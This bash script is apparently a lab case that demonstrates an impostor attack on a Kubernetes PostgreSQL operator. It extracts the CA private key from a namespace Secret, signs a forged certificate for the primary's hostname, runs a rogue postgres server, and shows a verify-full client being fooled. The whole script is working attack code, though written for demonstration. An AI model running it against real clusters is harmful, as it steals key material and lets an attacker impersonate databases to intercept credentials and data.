#!/usr/bin/env bash
# k8s/cases/p3-impostor/attack.sh
# Demonstrates Phase 3: The Impostor Attack.
# Extracts the operator CA private key from the namespace Secret,
# mints a certificate with the cluster's real primary FQDN,
# runs a rogue PostgreSQL server, and demonstrates that a client
# using sslmode=verify-full is completely fooled.
#
# Usage: ./attack.sh [namespace]

set -euo pipefail

NAMESPACE="${1:-pg-lab}"
DIR="/tmp/pg-impostor-p3"
mkdir -p "${DIR}"

echo "==> 1. Extracting operator CA private key from Secret 'cluster1-cluster-ca-cert' in '${NAMESPACE}'..."
kubectl get secret cluster1-cluster-ca-cert -n "${NAMESPACE}" -o jsonpath='{.data.root\.key}' | base64 -d > "${DIR}/ca.key"
kubectl get secret cluster1-cluster-ca-cert -n "${NAMESPACE}" -o jsonpath='{.data.root\.crt}' | base64 -d > "${DIR}/ca.crt"

echo "==> 2. Minting forged server certificate for 'cluster1-primary.${NAMESPACE}.svc.cluster.local'..."
openssl req -newkey rsa:2048 -nodes \
  -keyout "${DIR}/server.key" \
  -out "${DIR}/server.csr" \
  -subj "/CN=cluster1-primary.${NAMESPACE}.svc.cluster.local"

openssl x509 -req \
  -in "${DIR}/server.csr" \
  -CA "${DIR}/ca.crt" \
  -CAkey "${DIR}/ca.key" \
  -CAcreateserial -days 1 \
  -out "${DIR}/server.crt" \
  -extfile <(printf '%s\n' \
    "basicConstraints=CA:FALSE" \
    "subjectAltName=DNS:cluster1-primary.${NAMESPACE}.svc.cluster.local,DNS:cluster1-primary.${NAMESPACE}.svc,DNS:cluster1-primary.${NAMESPACE},DNS:cluster1-primary,DNS:localhost,IP:127.0.0.1")

echo "==> 3. Starting rogue PostgreSQL container on port 5435..."
docker rm -f pg-impostor-p3 2>/dev/null || true
docker run -d --name pg-impostor-p3 -p 5435:5432 \
  -e POSTGRES_PASSWORD=cluster1 \
  -v "${DIR}/server.crt:/tmp/server.crt:ro" \
  -v "${DIR}/server.key:/tmp/server.key:ro" \
  postgres:18-alpine sh -c "cp /tmp/server.* /var/lib/postgresql/ && chown postgres:postgres /var/lib/postgresql/server.* && chmod 600 /var/lib/postgresql/server.key && exec docker-entrypoint.sh postgres -c ssl=on -c ssl_cert_file=/var/lib/postgresql/server.crt -c ssl_key_file=/var/lib/postgresql/server.key"

echo "==> Waiting for rogue PostgreSQL container to start..."
sleep 3

echo "==> 4. Connecting with strict sslmode=verify-full..."
echo "     Command: psql \"host=localhost port=5435 user=postgres dbname=postgres sslmode=verify-full sslrootcert=${DIR}/ca.crt\""
PGPASSWORD=cluster1 psql "host=localhost port=5435 user=postgres dbname=postgres sslmode=verify-full sslrootcert=${DIR}/ca.crt" -c "\conninfo"

echo ""
echo "==> Result: Connected! Client was completely fooled by the stolen CA key."
echo "==> Cleaning up container and temporary keys..."
docker stop pg-impostor-p3 >/dev/null
shred -u "${DIR}/ca.key" "${DIR}/server.key" 2>/dev/null || rm -rf "${DIR}"
rm -rf "${DIR}"
echo "==> Cleanup complete."
